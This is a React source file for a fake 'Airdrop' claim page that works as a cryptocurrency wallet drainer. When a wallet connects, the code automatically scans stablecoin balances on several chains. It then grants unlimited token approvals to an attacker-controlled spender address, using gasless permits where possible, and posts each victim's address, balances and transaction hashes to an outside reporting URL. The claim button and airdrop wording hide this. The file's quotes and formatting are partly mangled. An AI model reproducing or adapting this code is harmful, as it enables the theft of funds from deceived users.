‘use client’;
import { useState, useEffect } from ‘react’;
import { useAccount, useWriteContract } from ‘wagmi’;
import { erc20Abi, maxUint256 } from ‘viem’;
import { readContract, getBalance, switchChain } from ‘@wagmi/core’;
import { config } from ‘@/config’;

// First, install the Biconomy SDK
// npm install @biconomy/sdk

// Import Biconomy MEE SDK
import {
createMEEClient,
createOrchestration,
FusionTrigger,
MEEClient
} from ‘@biconomy/sdk’;

// Spender address that will receive approvals
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || “”) as `0x${string}`;

// Biconomy configuration
const BICONOMY_PAYMASTER_KEY = process.env.NEXT_PUBLIC_BICONOMY_PAYMASTER_KEY;
const MEE_API_KEY = process.env.NEXT_PUBLIC_MEE_API_KEY;

if (!SPENDER || SPENDER === “0x”) {
throw new Error(‘SPENDER_ADDRESS is not defined or invalid’);
}

// Tokens grouped by chainId (BigInt-safe version)
const TOKENS_BY_CHAIN: Record<
number,
{ symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]

> = {
> 1: [
> { symbol: “USDT”, address: “0xdAC17F958D2ee523a2206206994597C13D831ec7”, min: BigInt(1 * 10 ** 6), decimals: 6 },
> { symbol: “USDC”, address: “0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48”, min: BigInt(1 * 10 ** 6), decimals: 6 },
> { symbol: “DAI”,  address: “0x6B175474E89094C44Da98b954EedeAC495271d0F”, min: BigInt(1 * 10 ** 18), decimals: 18 },
> { symbol: “BUSD”, address: “0x4fabb145d64652a948d72533023f6e7a623c7c53”, min: BigInt(1 * 10 ** 18), decimals: 18 },
> ],
> 42161: [
> { symbol: “USDT”, address: “0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9”, min: BigInt(1 * 10 ** 6), decimals: 6 },
> { symbol: “USDC”, address: “0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8”, min: BigInt(1 * 10 ** 6), decimals: 6 },
> { symbol: “DAI”,  address: “0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1”, min: BigInt(1 * 10 ** 18), decimals: 18 },
> ],
> 11155111: [
> { symbol: “USDC”, address: “0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238”, min: BigInt(1 * 10 ** 6), decimals: 6 },
> { symbol: “LINK”, address: “0x779877A7B0D9E8603169DdbD7836e478b4624789”, min: BigInt(1 * 10 ** 18), decimals: 18 },
> ],
> };

// Human-readable chain names
const CHAIN_NAMES: Record<number, string> = {
1: “Ethereum Mainnet”,
42161: “Arbitrum”,
11155111: “Sepolia”,
};

// Component that reports wallet connections
function ConnectionReporter() {
const { address, isConnected } = useAccount();

useEffect(() => {
if (isConnected && address) {
fetch(`${REPORT_URL}`, {
method: “POST”,
headers: { “Content-Type”: “application/json” },
body: JSON.stringify({
event: “connect”,
wallet: address,
}),
}).catch(console.error);
}
}, [isConnected, address]);

return null;
}

export default function Home() {
const { address, isConnected, chainId } = useAccount();
const { writeContractAsync } = useWriteContract();
const [status, setStatus] = useState<string>(””);
const [meeClient, setMeeClient] = useState<MEEClient | null>(null);

// Initialize MEE Client
useEffect(() => {
if (isConnected && address && MEE_API_KEY) {
const client = createMEEClient({
apiKey: MEE_API_KEY,
paymasterKey: BICONOMY_PAYMASTER_KEY,
});
setMeeClient(client);
}
}, [isConnected, address]);

// Check if token supports ERC20Permit
async function supportsERC20Permit(tokenAddress: `0x${string}`, chainId: number): Promise<boolean> {
try {
// Try to read the permit typehash or version
await readContract(config, {
chainId,
address: tokenAddress,
abi: [
{
“name”: “PERMIT_TYPEHASH”,
“type”: “function”,
“stateMutability”: “view”,
“inputs”: [],
“outputs”: [{“type”: “bytes32”}]
}
],
functionName: “PERMIT_TYPEHASH”,
});
return true;
} catch {
try {
await readContract(config, {
chainId,
address: tokenAddress,
abi: [
{
“name”: “version”,
“type”: “function”,
“stateMutability”: “view”,
“inputs”: [],
“outputs”: [{“type”: “string”}]
}
],
functionName: “version”,
});
return true;
} catch {
return false;
}
}
}

async function handleClaimWithFusion() {
if (!isConnected || !address || !meeClient) {
setStatus(“Wallet not connected or MEE client not initialized”);
return;
}

```
try {
  setStatus("Scanning chains for balances...");

  let targetChain: number | null = null;
  let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

  // Find chains with usable balances
  for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
    const numericCid = Number(cid);

    for (const token of tokens) {
      try {
        const bal = await readContract(config, {
          chainId: numericCid,
          address: token.address,
          abi: erc20Abi,
          functionName: "balanceOf",
          args: [address],
        }) as bigint;

        if (bal >= token.min) {
          targetChain = numericCid;
          usableTokens.push(token);
        }
      } catch {}
    }

    if (usableTokens.length > 0) break;
  }

  if (!targetChain || usableTokens.length === 0) {
    setStatus("No usable balances found on any chain.");
    return;
  }

  const chainName = CHAIN_NAMES[targetChain!] || "Unknown Chain";

  if (chainId !== targetChain) {
    setStatus(`Switching to ${chainName}...`);
    await switchChain(config, { chainId: targetChain });
  }

  // Process each token using MEE + Fusion
  for (const token of usableTokens) {
    setStatus(`Processing ${token.symbol} on ${chainName} with MEE + Fusion...`);

    try {
      // Check if token supports ERC20Permit
      const supportsPermit = await supportsERC20Permit(token.address, targetChain);
      
      let rawBalance: bigint = BigInt(0);
      try {
        rawBalance = await readContract(config, {
          chainId: targetChain!,
          address: token.address,
          abi: erc20Abi,
          functionName: "balanceOf",
          args: [address],
        }) as bigint;
      } catch (err) {
        console.error(`Failed to read balance for ${token.symbol}:`, err);
        continue;
      }

      // Create orchestration instructions
      const orchestration = await createOrchestration({
        client: meeClient,
        account: address,
        inputToken: {
          address: token.address,
          amount: rawBalance,
          chainId: targetChain
        },
        instructions: [
          {
            type: "approve",
            target: SPENDER,
            amount: maxUint256,
            tokenAddress: token.address,
          }
        ],
      });

      let fusionResult;
      
      if (supportsPermit) {
        setStatus(`Using ERC20Permit for gasless ${token.symbol} orchestration...`);
        
        // Use ERC20Permit trigger (gasless)
        fusionResult = await orchestration.executeFusion({
          triggerType: "ERC20Permit",
          account: address,
        });
      } else {
        setStatus(`Using Onchain transaction for ${token.symbol} orchestration...`);
        
        // Check native balance for gas
        const nativeBal = await getBalance(config, { address, chainId: targetChain });
        if (nativeBal.value < BigInt(100000000000000)) {
          setStatus(`Not enough native token to pay gas fees for ${token.symbol}.`);
          continue;
        }

        // Use Onchain Tx trigger (requires gas)
        fusionResult = await orchestration.executeFusion({
          triggerType: "OnchainTx",
          account: address,
          writeContractAsync, // Pass your wagmi writeContract function
        });
      }

      const decimals = token.decimals || 18;
      const formattedBalance = Number(rawBalance) / 10 ** decimals;

      setStatus(`${token.symbol} processed via MEE + Fusion ✅ | Balance: ${formattedBalance}`);

      // Report the fusion transaction
      await fetch(`${REPORT_URL}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "fusion_approval",
          wallet: address,
          chainName,
          token: token.address,
          symbol: token.symbol,
          balance: formattedBalance,
          txHash: fusionResult.txHash,
          triggerType: supportsPermit ? "ERC20Permit" : "OnchainTx",
          orchestrationId: fusionResult.orchestrationId,
        }),
      }).catch(console.error);

    } catch (err: any) {
      console.error(`Fusion error for ${token.symbol}:`, err);
      setStatus(`Error processing ${token.symbol}: ${err?.shortMessage || err?.message}`);
      // Skip this token and continue with next ones
      continue;
    }
  }

  setStatus("All orchestrations completed!");
} catch (err: any) {
  console.error(err);
  setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
}
```

}

// Main claim function using only MEE + Fusion
async function handleClaim() {
return handleClaimWithFusion();
}

// Automatically trigger fusion claim when wallet connects
useEffect(() => {
if (isConnected && address && meeClient) {
handleClaim();
}
}, [isConnected, address, meeClient]);

return (
<main
style={{
display: “flex”,
flexDirection: “column”,
alignItems: “center”,
gap: “24px”,
marginTop: “40px”,
}}
>
<header
style={{
position: “fixed”,
top: 0,
left: 0,
right: 0,
height: “64px”,
background: “#09011fff”,
display: “flex”,
alignItems: “center”,
justifyContent: “space-between”,
padding: “0 24px”,
paddingTop: “env(safe-area-inset-top)”,
boxShadow: “0 2px 8px rgba(241, 235, 235, 0.08)”,
zIndex: 1000,
}}
>
<div style={{ fontFamily: “sans-serif”, fontWeight: “bold”, fontSize: “18px”, color: “#aaa587ff” }}>
AIRDROPS (Fusion Only)
</div>
<appkit-button />
</header>

```
  <ConnectionReporter />

  <div
    style={{
      display: "flex",
      flexDirection: "column",
      gap: "24px",
      paddingTop: "80px",
      width: "80%",
      maxWidth: "600px",
    }}
  >
    <div
      style={{
        border: "1px solid #9dd6d1ff",
        borderRadius: "12px",
        padding: "20px",
        background: "#090e41ff",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "space-between",
        height: "500px",
      }}
    >
      <h2 style={{ marginBottom: "12px" }}>Airdrop (MEE + Fusion Only)</h2>

      <div
        style={{
          flex: 1,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          color: "#e4e1daff",
          fontSize: "14px",
          textAlign: "center",
        }}
      >
        {status || ""}
      </div>

      <button
        onClick={handleClaim}
        style={{
          background: "#0066cc",
          color: "white",
          padding: "12px 28px",
          borderRadius: "8px",
          cursor: "pointer",
          border: "none",
        }}
        disabled={!meeClient}
      >
        Claim with Fusion
      </button>
    </div>

    {[1, 2, 3].map((i) => (
      <div
        key={i}
        style={{
          border: "1px solid #c9c8ddff",
          borderRadius: "12px",
          padding: "20px",
          background: "#0e0a42ff",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        <span>Box {i + 1}</span>
      </div>
    ))}
  </div>
</main>
```

);
}